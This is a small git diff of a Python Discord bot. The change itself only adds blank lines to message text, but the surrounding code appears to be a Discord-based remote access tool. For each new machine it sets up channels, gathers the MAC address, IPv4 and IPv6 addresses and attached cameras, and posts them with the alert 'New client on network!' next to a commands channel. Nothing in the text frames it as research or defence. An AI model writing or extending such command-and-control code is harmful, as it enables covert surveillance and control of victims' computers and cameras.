@@ -115,7 +115,7 @@ async def on_ready():
             await guild.create_text_channel("info", category=category)
             await guild.create_text_channel("events", category=category)
             await guild.create_text_channel("commands", category=category)
-            
+
             ipv6 = get_ipv6_address()
             ipv4 = get_device_ip4()
 
@@ -126,10 +126,15 @@ async def on_ready():
                 cameras = "No cameras found."
 
             des = f"""Mac address: {ip}
+
             Ipv6: {ipv6}
+
             Ipv4: {ipv4}
+
             Cameras: {cameras}
+
             Use commands in: {nextcord.utils.get(category.text_channels, name='commands').mention}
+
             @everyone"""
 
             embed = nextcord.Embed(title="New client on network!", timestamp=datetime.now(), colour=0xe4f500, description=des)
@@ -139,8 +144,11 @@ async def on_ready():
             channel = nextcord.utils.get(category.text_channels, name="info")
 
             des = f"""Mac address: {ip}
+
             Ipv6: {ipv6}
+
             Ipv4: {ipv4}
+            
             Cameras: {cameras}"""
 
             embed = nextcord.Embed(title="Client info:", timestamp=datetime.now(), colour=0xe4f500, description=des)
